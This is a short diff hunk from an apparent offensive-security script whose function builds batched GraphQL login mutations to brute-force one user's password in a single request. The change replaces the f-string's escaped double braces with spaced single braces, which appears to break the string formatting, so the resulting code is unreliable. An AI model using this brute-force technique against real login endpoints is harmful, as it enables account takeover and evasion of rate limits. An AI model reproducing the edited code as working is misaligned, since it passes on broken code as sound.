@@ -66,12 +66,12 @@ def graphql_batch_bruteforce(url, username, passwords):
     for i, password in enumerate(passwords):
         queries.append({
             "query": f"""
-                mutation login{i} {{
-                    login(username: "{username}", password: "{password}") {{
+                mutation login{i} { {
+                    login(username: "{username}", password: "{password}") { {
                         token
                         success
-                    }}
-                }}
+                    } }
+                } }
             """
         })
 
